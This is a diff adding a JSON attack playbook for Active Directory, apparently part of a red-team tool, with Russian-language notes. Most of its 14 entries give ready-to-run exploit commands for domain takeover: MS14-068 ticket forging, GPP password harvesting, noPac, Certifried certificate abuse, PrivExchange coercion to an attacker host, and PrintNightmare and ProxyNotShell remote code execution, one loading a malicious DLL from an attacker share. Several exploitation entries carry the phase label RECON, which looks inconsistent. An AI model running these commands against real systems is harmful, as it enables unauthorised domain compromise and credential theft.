@@ -1,0 +1,142 @@
+[
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "MS14-068 (Kerberos Checksum)",
+    "tool": "findSMB2UPTime.py",
+    "req": "Network Access",
+    "command": "findSMB2UPTime.py <ip>",
+    "profit": "Vulnerability Check (Uptime)",
+    "critical_note": "Проверка времени работы системы для косвенной оценки наличия патчей безопасности.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "MS14-068 (Kerberos Checksum)",
+    "tool": "ms14-068.py",
+    "req": "Authenticated User, Vulnerable DC",
+    "command": "python ms14-068.py -u <user>@<domain> -p <password> -s <user_sid> -d <dc_fqdn>",
+    "profit": "Domain Admin (via PTT)",
+    "critical_note": "Эксплуатация уязвимости в KDC для подделки PAC (Privilege Attribute Certificate).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "MS14-068 (Kerberos Checksum)",
+    "tool": "Metasploit (ms14_068_kerberos_checksum)",
+    "req": "Authenticated User, Vulnerable DC",
+    "command": "use auxiliary/admin/kerberos/ms14_068_kerberos_checksum; run",
+    "profit": "Domain Admin (Ticket Forging)",
+    "critical_note": "Модуль Metasploit для эксплуатации уязвимости Kerberos Checksum.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "MS14-068 (Kerberos Checksum)",
+    "tool": "goldenPac.py",
+    "req": "Authenticated User, Vulnerable DC",
+    "command": "goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target",
+    "profit": "Domain Admin (via PTT)",
+    "critical_note": "Автоматизированная эксплуатация MS14-068 (Impacket) для получения прав администратора.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "GPP MS14-025",
+    "tool": "Metasploit (smb_enum_gpp)",
+    "req": "Access to SYSVOL",
+    "command": "use auxiliary/scanner/smb/smb_enum_gpp; run",
+    "profit": "Domain Admin (Credentials)",
+    "critical_note": "Сканер Metasploit для поиска XML-файлов групповых политик с паролями.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "GPP MS14-025",
+    "tool": "findstr",
+    "req": "Access to SYSVOL",
+    "command": "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
+    "profit": "Domain Admin (Credentials)",
+    "critical_note": "Ручной поиск атрибута cpassword в файлах политик.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "GPP MS14-025",
+    "tool": "Get-GPPPassword.py",
+    "req": "Access to SYSVOL",
+    "command": "python Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>",
+    "profit": "Domain Admin (Credentials)",
+    "critical_note": "Скрипт Impacket для извлечения и расшифровки паролей GPP.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "PrivExchange (CVE-2019-0724, CVE-2019-0686)",
+    "tool": "privexchange.py",
+    "req": "Exchange Server, Authenticated User",
+    "command": "python privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>",
+    "profit": "Domain Admin / Admin (via HTTP Coerce)",
+    "critical_note": "Принуждение Exchange-сервера к аутентификации на хосте атакующего (HTTP Coerce).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "noPac (CVE-2021-42287, CVE-2021-42278)",
+    "tool": "NetExec (nxc)",
+    "req": "Vulnerable DC",
+    "command": "nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan",
+    "profit": "Vulnerability Confirmation",
+    "critical_note": "Сканирование на уязвимость sAMAccountName spoofing.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "noPac (CVE-2021-42287, CVE-2021-42278)",
+    "tool": "noPac.exe",
+    "req": "Authenticated User",
+    "command": "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt",
+    "profit": "Domain Admin (via PTT -> DCSYNC)",
+    "critical_note": "Получение TGT с правами контроллера домена через подмену имени учетной записи.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "PrintNightmare (CVE-2021-1675, CVE-2021-34527)",
+    "tool": "NetExec (nxc)",
+    "req": "Print Spooler Enabled",
+    "command": "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan",
+    "profit": "Vulnerability Confirmation",
+    "critical_note": "Сканирование на наличие уязвимости PrintNightmare.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "PrintNightmare (CVE-2021-1675, CVE-2021-34527)",
+    "tool": "printnightmare.py",
+    "req": "Print Spooler Service Enabled",
+    "command": "python printnightmare.py -dll \\\\<attacker_ip>\\smb\\add_user.dll '<user>:<password>@<ip>'",
+    "profit": "Admin (RCE)",
+    "critical_note": "Удаленное выполнение кода через загрузку вредоносной DLL.",
+    "kill_chain_phase": "ACCESS"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "Certifried (CVE-2022-26923)",
+    "tool": "certipy",
+    "req": "Active Directory Certificate Services (AD CS)",
+    "command": "certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>' && certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine && certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>",
+    "profit": "Domain Admin (via PTT -> DCSYNC)",
+    "critical_note": "Полная цепочка атаки: создание учетной записи, запрос сертификата и аутентификация.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Know vulnerabilities authenticated",
+    "attack_type": "ProxyNotShell (CVE-2022-41040, CVE-2022-41082)",
+    "tool": "poc_aug3.py",
+    "req": "Exchange Server, Authenticated User",
+    "command": "python poc_aug3.py <host> <username> <password> <command>",
+    "profit": "Admin (RCE)",
+    "critical_note": "Эксплуатация SSRF и RCE на сервере Microsoft Exchange.",
+    "kill_chain_phase": "ACCESS"
+  }
+]
